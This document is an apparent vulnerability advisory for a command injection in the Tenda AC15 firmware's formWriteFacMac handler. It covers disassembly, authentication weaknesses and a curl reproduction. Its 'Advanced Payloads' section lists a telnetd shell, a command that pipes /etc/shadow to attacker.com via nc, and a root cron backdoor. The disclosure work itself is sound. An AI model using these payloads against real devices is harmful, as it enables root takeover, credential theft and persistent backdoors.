# [REDACTED-ID]_004: Command Injection in formWriteFacMac via "mac" Parameter

## Summary

The `formWriteFacMac` handler in Tenda AC15 firmware V15.03.05.19 passes the user-supplied `mac` HTTP POST parameter directly to `doSystemCmd("cfm mac %s")` without any sanitization, enabling arbitrary OS command execution as root.

## Affected Products

| Product | Firmware Version | Architecture |
|---------|-----------------|-------------|
| Tenda AC15 | V15.03.05.19 (EN) | ARM 32-bit |

**Note:** This handler is NOT present in AC20 V16.03.08.12.

## Vulnerability Details

### Function: `formWriteFacMac` (vaddr: 0x000455d0, size: 128 bytes)

The entire function is trivially simple:

```
1. 0x0004560c: websGetVar(wp, "mac", "00:01:02:11:22:33")  → user input
2. 0x00045628: websWrite(wp, "modify mac only.")            → response text
3. 0x00045638: doSystemCmd("cfm mac %s", user_mac_input)    → COMMAND INJECTION
```

There is **zero validation** of the `mac` parameter between input and command execution.

### Disassembly (ARM)

```asm
0x000455f4: ldr r3, [0x45654]     ; "mac" parameter name
0x0004560c: bl  fcn.0002bd4c      ; websGetVar("mac", "00:01:02:11:22:33")
0x00045610: str r0, [var_10h]     ; store user input pointer
0x0004562c: add r3, r4, r3        ; "cfm mac %s" format string
0x00045630: mov r0, r3            ; format = "cfm mac %s"
0x00045634: ldr r1, [var_10h]     ; arg1 = user input (UNSANITIZED)
0x00045638: bl  sym.imp.doSystemCmd  ; executes: cfm mac <user_input>
```

### Authentication Requirement

This endpoint requires authentication (it is NOT in the R7WebsSecurityHandler whitelist). However:
- Default admin password is **empty** (`sys.userpass=` in NVRAM defaults)
- Password is stored in **plaintext cookie** (`Set-Cookie: password=%s`)
- Combined with [REDACTED-ID]_003 (shared TLS key), the password can be captured via MITM

## Reproduction Steps

```bash
# Authenticated command injection (default empty password)
curl -X POST http://<target>/goform/WriteFacMac \
  -H "Cookie: password=" \
  -d 'mac=;id'

# Expected: executes "cfm mac ;id" → "id" runs as root
# Output: "modify mac only." (server response before command executes)
```

### Advanced Payloads

```bash
# Reverse shell
mac=;telnetd -l /bin/sh -p 4444 &

# Exfiltrate /etc/shadow
mac=;cat /etc/shadow | nc attacker.com 9999 &

# Persistent backdoor
mac=;echo "0 * * * * /usr/bin/telnetd -p 4445" >> /var/spool/cron/crontabs/root &
```

## Impact

- **Confidentiality:** High — Read any file, dump credentials, intercept traffic
- **Integrity:** High — Modify device config, install backdoors, change firmware
- **Availability:** High — Crash device, brick firmware, DoS

## CVSS v3.1

**Score: 8.8 (High)** — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

## CWE Classification

- **CWE-78:** Improper Neutralization of Special Elements used in an OS Command
- **CWE-77:** Improper Neutralization of Special Elements used in a Command

## Related CVEs

- **CVE-2024-10697:** Same vulnerability in Tenda AC6 [REDACTED-IP] (different model, same firmware branch)
- **AC15 V15.03.20:** Reported at github.com/abcdefg-png/IoT-vulnerable (different firmware version)
- **This finding (V15.03.05.19)** may require a separate CVE if not explicitly covered

## Status

- **Discovery:** Static analysis via r2 disassembly
- **Novelty:** Known pattern, but specific firmware version may not be covered by existing CVE
- **Validation:** Pending (requires emulation or hardware)
